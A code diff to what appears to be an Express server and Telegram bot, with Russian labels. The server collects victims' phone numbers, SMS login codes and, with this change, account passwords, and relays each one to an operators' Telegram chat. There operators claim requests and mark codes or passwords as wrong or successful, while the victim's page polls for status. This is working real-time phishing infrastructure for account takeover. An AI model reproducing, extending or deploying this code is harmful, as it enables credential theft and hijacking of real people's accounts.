@@ -82,11 +82,15 @@ const buildSmsMessageText = (requestId, code, phone, takenBy = "", isSuccess = f
   return lines.join("\n");
 };
 
-const buildNameMessageText = (requestId, name, phone, takenBy = "") => {
-  const lines = [
-    `ID: ${requestId}`,
-    `🪪 Имя: ${name}`
-  ];
+const buildNameMessageText = (requestId, name, phone, takenBy = "", isSuccess = false) => {
+  const lines = [];
+
+  if (isSuccess) {
+    lines.push("✅ Успех");
+  }
+
+  lines.push(`ID: ${requestId}`);
+  lines.push(`🪪 Пароль: ${name}`);
 
   if (phone) {
     lines.push(`📞 Номер: ${phone}`);
@@ -102,7 +106,7 @@ const buildNameMessageText = (requestId, name, phone, takenBy = "") => {
 const buildPhoneKeyboard = (requestId, status) => {
   if (status === "taken") {
     return {
-      inline_keyboard: [[{ text: "Дальше", callback_data: `next:${requestId}` }]]
+      inline_keyboard: [[{ text: "Код", callback_data: `next:${requestId}` }]]
     };
   }
 
@@ -113,7 +117,7 @@ const buildPhoneKeyboard = (requestId, status) => {
   }
 
   return {
-    inline_keyboard: [[{ text: "Взять в телеграме", callback_data: `take:${requestId}` }]]
+    inline_keyboard: [[{ text: "Взять", callback_data: `take:${requestId}` }]]
   };
 };
 
@@ -121,7 +125,14 @@ const buildSmsKeyboard = (requestId) => ({
   inline_keyboard: [[
     { text: "Неверный код", callback_data: `wrongcode:${requestId}` },
     { text: "Успех", callback_data: `smssuccess:${requestId}` },
-    { text: "Имя", callback_data: `name:${requestId}` }
+    { text: "Пароль", callback_data: `name:${requestId}` }
+  ]]
+});
+
+const buildNameKeyboard = (requestId) => ({
+  inline_keyboard: [[
+    { text: "Неверный пароль", callback_data: `wrongpassword:${requestId}` },
+    { text: "Успех", callback_data: `passwordsuccess:${requestId}` }
   ]]
 });
 
@@ -162,6 +173,25 @@ const editSmsTelegramMessage = async (requestState) => {
       Boolean(requestState.smsSuccess)
     ),
     reply_markup: buildSmsKeyboard(requestState.requestId)
+  });
+};
+
+const editNameTelegramMessage = async (requestState) => {
+  if (!requestState?.nameMessageId || !requestState.lastName) {
+    return;
+  }
+
+  return callTelegramApi("editMessageText", {
+    chat_id: chatId,
+    message_id: requestState.nameMessageId,
+    text: buildNameMessageText(
+      requestState.requestId,
+      requestState.lastName,
+      requestState.phone,
+      requestState.takenBy,
+      Boolean(requestState.passwordSuccess)
+    ),
+    reply_markup: buildNameKeyboard(requestState.requestId)
   });
 };
 
@@ -295,6 +325,50 @@ const handleNameAction = async (requestId, callbackQuery) => {
   await answerCallbackQuery(callbackQuery.id, "Открыт экран имени");
 };
 
+const handleWrongPasswordAction = async (requestId, callbackQuery) => {
+  const requestState = requestStates.get(requestId);
+
+  if (!requestState) {
+    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
+    return;
+  }
+
+  if (!canManageRequest(requestState, callbackQuery)) {
+    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
+    return;
+  }
+
+  requestState.passwordErrorCount = (requestState.passwordErrorCount || 0) + 1;
+  requestState.updatedAt = Date.now();
+
+  await answerCallbackQuery(callbackQuery.id, "Неверный пароль");
+};
+
+const handlePasswordSuccessAction = async (requestId, callbackQuery) => {
+  const requestState = requestStates.get(requestId);
+
+  if (!requestState) {
+    await answerCallbackQuery(callbackQuery.id, "Заявка не найдена");
+    return;
+  }
+
+  if (!canManageRequest(requestState, callbackQuery)) {
+    await answerCallbackQuery(callbackQuery.id, "Доступ только у того, кто взял заявку");
+    return;
+  }
+
+  if (!requestState.nameMessageId || !requestState.lastName) {
+    await answerCallbackQuery(callbackQuery.id, "Сообщение с паролем не найдено");
+    return;
+  }
+
+  requestState.passwordSuccess = true;
+  requestState.updatedAt = Date.now();
+
+  await editNameTelegramMessage(requestState);
+  await answerCallbackQuery(callbackQuery.id, "Успех отмечен");
+};
+
 const handleTelegramUpdate = async (update) => {
   const callbackQuery = update.callback_query;
   if (!callbackQuery?.data) {
@@ -329,6 +403,16 @@ const handleTelegramUpdate = async (update) => {
 
   if (action === "name") {
     await handleNameAction(requestId, callbackQuery);
+    return;
+  }
+
+  if (action === "wrongpassword") {
+    await handleWrongPasswordAction(requestId, callbackQuery);
+    return;
+  }
+
+  if (action === "passwordsuccess") {
+    await handlePasswordSuccessAction(requestId, callbackQuery);
   }
 };
 
@@ -382,10 +466,13 @@ app.post("/api/send-phone", async (req, res) => {
       takenByUserId: null,
       messageId: message.message_id,
       codeMessageId: null,
+      nameMessageId: null,
       lastCode: "",
-      smsSuccess: false,
       lastName: "",
+      smsSuccess: false,
+      passwordSuccess: false,
       codeErrorCount: 0,
+      passwordErrorCount: 0,
       updatedAt: Date.now()
     });
 
@@ -411,7 +498,8 @@ app.get("/api/request-status", (req, res) => {
     ok: true,
     status: requestState.status,
     takenBy: requestState.takenBy,
-    codeErrorCount: requestState.codeErrorCount || 0
+    codeErrorCount: requestState.codeErrorCount || 0,
+    passwordErrorCount: requestState.passwordErrorCount || 0
   });
 });
 
@@ -459,18 +547,21 @@ app.post("/api/send-name", async (req, res) => {
   }
 
   if (!name || typeof name !== "string" || !name.trim()) {
-    return res.status(400).json({ error: "Некорректное имя" });
+    return res.status(400).json({ error: "Некорректный пароль" });
   }
 
   const requestState = requestStates.get(requestId);
 
   try {
-    await sendTelegramMessage(
-      buildNameMessageText(requestId, name.trim(), phone || requestState?.phone || "", requestState?.takenBy || "")
+    const message = await sendTelegramMessage(
+      buildNameMessageText(requestId, name.trim(), phone || requestState?.phone || "", requestState?.takenBy || "", false),
+      buildNameKeyboard(requestId)
     );
 
     if (requestState) {
       requestState.lastName = name.trim();
+      requestState.nameMessageId = message.message_id;
+      requestState.passwordSuccess = false;
       requestState.updatedAt = Date.now();
     }
 
